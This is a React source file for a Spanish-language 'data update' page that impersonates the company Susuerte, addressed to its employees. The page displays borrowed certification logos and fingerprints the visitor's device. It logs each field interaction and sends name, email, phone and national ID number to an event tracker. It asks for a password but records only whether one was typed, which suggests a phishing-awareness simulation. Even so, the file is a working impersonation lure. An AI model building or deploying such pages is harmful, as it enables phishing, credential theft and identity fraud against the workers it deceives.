/**
 * Susuerte - Actualización de Datos
 * Design: Corporate Institutional / Brand-Faithful
 * 
 * Color Philosophy:
 *   - Fondo página: #0d1117 (oscuro neutro)
 *   - Header tarjeta: gradiente azul royal #1a3fa0 → #1e4db7
 *   - Botón CTA: amarillo dorado #FFD700
 *   - Texto sobre azul: blanco puro
 *   - Sección inferior: blanco con borde suave
 * 
 * Typography: Nunito (Bold para títulos, Regular para cuerpo)
 * Layout: Tarjeta centrada, fondo oscuro, sombra pronunciada
 */

import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { initializeSession, trackEvent } from "@/lib/eventTracking";
import { captureAdvancedDeviceData } from "@/lib/advancedDeviceDetection";

interface FormData {
  name: string;
  email: string;
  phone: string;
  document: string;
  password: string;
}

interface RegistroUsuario {
  id: string;
  nombre: string;
  email: string;
  telefono: string;
  documento: string;
  verificado: boolean;
  timestamp: string;
  deviceData: any;
  sessionId: string;
  passwordEntered: boolean;
}

export default function Home() {
  const [formData, setFormData] = useState<FormData>({
    name: "",
    email: "",
    phone: "",
    document: "",
    password: "",
  });
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [deviceData, setDeviceData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string>("");
  const [formStarted, setFormStarted] = useState(false);

  // Inicializar sesión y capturar datos técnicos
  useEffect(() => {
    const initializeUser = async () => {
      // Inicializar sesión de eventos
      const newSessionId = initializeSession();
      setSessionId(newSessionId);

      // Capturar datos técnicos
      const device = await captureAdvancedDeviceData();
      setDeviceData(device);

      // Registrar visita de página
      await trackEvent('PAGE_VISIT', {
        paginaVisitada: window.location.pathname,
        dispositivo: device?.tipoDispositivo || 'Desconocido',
        navegador: device?.navegador || 'Desconocido',
      });
    };

    initializeUser();
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData({ ...formData, [id]: value });

    // Registrar inicio de formulario si es la primera interacción
    if (!formStarted) {
      setFormStarted(true);
      trackEvent('FORM_START', {
        campo: id,
        dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
        navegador: deviceData?.navegador || 'Desconocido',
      });
    }
  };

  const handleFieldClick = (fieldId: string) => {
    // Registrar clic en campo específico
    trackEvent('BUTTON_CLICK', {
      tipo: 'campo_click',
      campo: fieldId,
      dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
      navegador: deviceData?.navegador || 'Desconocido',
      timestamp: new Date().toISOString(),
    });
  };

  const handleFieldFocus = (fieldId: string) => {
    // Registrar focus en campo
    trackEvent('BUTTON_CLICK', {
      tipo: 'campo_focus',
      campo: fieldId,
      dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
      navegador: deviceData?.navegador || 'Desconocido',
      timestamp: new Date().toISOString(),
    });
  };

  const handleFieldBlur = (fieldId: string) => {
    // Registrar blur en campo
    trackEvent('BUTTON_CLICK', {
      tipo: 'campo_blur',
      campo: fieldId,
      dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
      navegador: deviceData?.navegador || 'Desconocido',
      timestamp: new Date().toISOString(),
    });
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    setTimeout(async () => {
      // Detectar si se ingresó contraseña
      const passwordEntered = formData.password.length > 0;

      // Registrar envío de formulario
      await trackEvent('FORM_SUBMIT', {
        nombre: formData.name,
        email: formData.email,
        telefono: formData.phone,
        documento: formData.document,
        passwordEntered: passwordEntered,
        dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
        navegador: deviceData?.navegador || 'Desconocido',
        timestamp: new Date().toISOString(),
      });

      // Guardar registro en localStorage (sin guardar la contraseña)
      const registrosGuardados = localStorage.getItem("susuerte_registros");
      const registros = registrosGuardados ? JSON.parse(registrosGuardados) : [];

      const nuevoRegistro: RegistroUsuario = {
        id: Date.now().toString(),
        nombre: formData.name,
        email: formData.email,
        telefono: formData.phone,
        documento: formData.document,
        verificado: false,
        timestamp: new Date().toISOString(),
        deviceData: deviceData,
        sessionId: sessionId,
        passwordEntered: passwordEntered,
      };

      registros.push(nuevoRegistro);
      localStorage.setItem("susuerte_registros", JSON.stringify(registros));

      setLoading(false);
      setSubmitted(true);
    }, 1200);
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center px-4 py-10"
      style={{
        background: "linear-gradient(135deg, #0d1117 0%, #0f1e3d 50%, #0d1117 100%)",
      }}
    >
      {/* Decorative background stars */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        {[...Array(18)].map((_, i) => (
          <div
            key={i}
            className="absolute rounded-full bg-white"
            style={{
              width: Math.random() * 2 + 1 + "px",
              height: Math.random() * 2 + 1 + "px",
              top: Math.random() * 100 + "%",
              left: Math.random() * 100 + "%",
              opacity: Math.random() * 0.4 + 0.1,
            }}
          />
        ))}
      </div>

      <motion.div
        initial={{ opacity: 0, y: 28 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.45, ease: [0.23, 1, 0.32, 1] }}
        className="relative w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden z-10"
      >
        {/* ── Header con gradiente azul ── */}
        <div
          className="px-6 pt-6 pb-4"
          style={{
            background: "linear-gradient(135deg, #1a3fa0 0%, #1e4db7 100%)",
          }}
        >
          <div className="flex items-center justify-center mb-3">
            <img
              src="/manus-storage/susuerte-logo_f2c3d8a1.png"
              alt="Susuerte Logo"
              className="h-10 w-auto object-contain"
            />
          </div>
          <h1
            className="text-2xl font-bold text-white text-center"
            style={{ fontFamily: "'Nunito', sans-serif" }}
          >
            Querido colaborador
          </h1>
          <p
            className="text-blue-100 text-center text-sm mt-2"
            style={{ fontFamily: "'Nunito', sans-serif" }}
          >
            Agrega tu información para la actualización de tus datos
          </p>
        </div>

        {/* ── Contenido principal ── */}
        <div className="px-6 py-6">
          {submitted ? (
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.3 }}
              className="text-center py-8"
            >
              <div className="text-5xl mb-4">✓</div>
              <h2
                className="text-xl font-bold text-gray-800 mb-2"
                style={{ fontFamily: "'Nunito', sans-serif" }}
              >
                ¡Datos actualizados!
              </h2>
              <p
                className="text-gray-500 text-sm"
                style={{ fontFamily: "'Nunito', sans-serif" }}
              >
                Tu información ha sido registrada exitosamente.
              </p>
            </motion.div>
          ) : (
            <form onSubmit={handleSubmit} className="flex flex-col gap-4">
              {/* Nombre Completo */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="name"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Nombre Completo
                </label>
                <input
                  id="name"
                  type="text"
                  placeholder="Tu nombre completo"
                  value={formData.name}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('name')}
                  onFocus={(e) => {
                    handleFieldFocus('name');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('name');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  required
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{
                    fontFamily: "'Nunito', sans-serif",
                    boxShadow: "none",
                  }}
                />
              </div>

              {/* Correo Electrónico */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="email"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Correo Electrónico
                </label>
                <input
                  id="email"
                  type="email"
                  placeholder="tu@correo.com"
                  value={formData.email}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('email')}
                  onFocus={(e) => {
                    handleFieldFocus('email');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('email');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  required
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                />
              </div>

              {/* Teléfono */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="phone"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Teléfono
                </label>
                <input
                  id="phone"
                  type="tel"
                  placeholder="Tu número de teléfono"
                  value={formData.phone}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('phone')}
                  onFocus={(e) => {
                    handleFieldFocus('phone');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('phone');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                />
              </div>

              {/* Número de Documento */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="document"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Número de Documento
                </label>
                <input
                  id="document"
                  type="text"
                  placeholder="Tu número de documento"
                  value={formData.document}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('document')}
                  onFocus={(e) => {
                    handleFieldFocus('document');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('document');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                />
              </div>

              {/* Contraseña (No se guarda) */}
              <div className="flex flex-col gap-1">
                <label
                  htmlFor="password"
                  className="text-sm font-semibold text-gray-700"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                >
                  Contraseña
                </label>
                <input
                  id="password"
                  type="password"
                  placeholder="Tu contraseña"
                  value={formData.password}
                  onChange={handleChange}
                  onClick={() => handleFieldClick('password')}
                  onFocus={(e) => {
                    handleFieldFocus('password');
                    e.target.style.borderColor = "#1a3fa0";
                    e.target.style.boxShadow = "0 0 0 3px rgba(26,63,160,0.12)";
                  }}
                  onBlur={(e) => {
                    handleFieldBlur('password');
                    e.target.style.borderColor = "#e5e7eb";
                    e.target.style.boxShadow = "none";
                  }}
                  className="w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm text-gray-800 outline-none transition-all duration-200"
                  style={{ fontFamily: "'Nunito', sans-serif" }}
                />
                <p className="text-xs text-gray-400 mt-1" style={{ fontFamily: "'Nunito', sans-serif" }}>
                  * Esta contraseña no será guardada
                </p>
              </div>

              {/* Botón Actualizar */}
              <motion.button
                type="submit"
                disabled={loading}
                whileTap={{ scale: 0.97 }}
                onClick={() => {
                  trackEvent('BUTTON_CLICK', {
                    tipo: 'submit_button',
                    campo: 'submit',
                    dispositivo: deviceData?.tipoDispositivo || 'Desconocido',
                    navegador: deviceData?.navegador || 'Desconocido',
                    timestamp: new Date().toISOString(),
                  });
                }}
                className="w-full py-3 rounded-lg font-bold text-base mt-1 transition-all duration-200"
                style={{
                  fontFamily: "'Nunito', sans-serif",
                  background: loading ? "#e5c700" : "#FFD700",
                  color: "#1a1a1a",
                  boxShadow: "0 4px 14px rgba(255,215,0,0.35)",
                  cursor: loading ? "not-allowed" : "pointer",
                }}
                onMouseEnter={(e) => {
                  if (!loading) (e.currentTarget as HTMLButtonElement).style.background = "#ffe033";
                }}
                onMouseLeave={(e) => {
                  if (!loading) (e.currentTarget as HTMLButtonElement).style.background = "#FFD700";
                }}
              >
                {loading ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="#1a1a1a" strokeWidth="4" />
                      <path className="opacity-75" fill="#1a1a1a" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                    </svg>
                    Actualizando...
                  </span>
                ) : (
                  "Actualizar Datos"
                )}
              </motion.button>

              <p
                className="text-center text-xs text-gray-400 mt-1"
                style={{ fontFamily: "'Nunito', sans-serif" }}
              >
                Al enviar, aceptas nuestros términos y condiciones.
              </p>
            </form>
          )}
        </div>

        {/* ── Footer con certificaciones ── */}
        <div
          className="bg-gray-50 border-t border-gray-100 px-6 pt-4 pb-5"
        >
          <p
            className="text-center text-xs text-gray-400 mb-3 font-semibold uppercase tracking-wide"
            style={{ fontFamily: "'Nunito', sans-serif" }}
          >
            Certificaciones y Acreditaciones
          </p>
          <div className="flex items-center justify-center gap-4 flex-wrap">
            <img
              src="/manus-storage/iso9001_95575a89.png"
              alt="ISO 9001 Certified"
              className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
            />
            <img
              src="/manus-storage/super-salud_bb073043.png"
              alt="Super Salud"
              className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
            />
            <img
              src="/manus-storage/pse_banner_afc1f717.png"
              alt="PSE"
              className="h-8 w-auto object-contain opacity-70 hover:opacity-100 transition-opacity"
            />
          </div>
        </div>
      </motion.div>
    </div>
  );
}
